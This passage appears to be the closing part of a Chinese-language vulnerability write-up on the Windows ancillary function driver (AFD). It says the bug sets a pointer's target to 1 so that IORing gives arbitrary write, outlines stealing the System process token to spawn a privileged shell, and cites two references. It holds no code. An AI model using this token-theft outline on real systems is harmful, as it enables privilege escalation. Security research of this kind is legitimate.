漏洞最终结果就是我们传入的pPwnPtr的内容改为1，因此可以利用IORing任意写。
- 读取System进程的token
- 将指定进程的token改成system进程token；或者该当前进程，然后SpawnShell

## 参考

- [pwning-windows-ancillary-function-driver](https://securityintelligence.com/x-force/patch-tuesday-exploit-wednesday-pwning-windows-ancillary-function-driver-winsock/)
- [Reverse-Engineering-Windows-AFD](https://recon.cx/2015/slides/recon2015-20-steven-vittitoe-Reverse-Engineering-Windows-AFD-sys.pdf)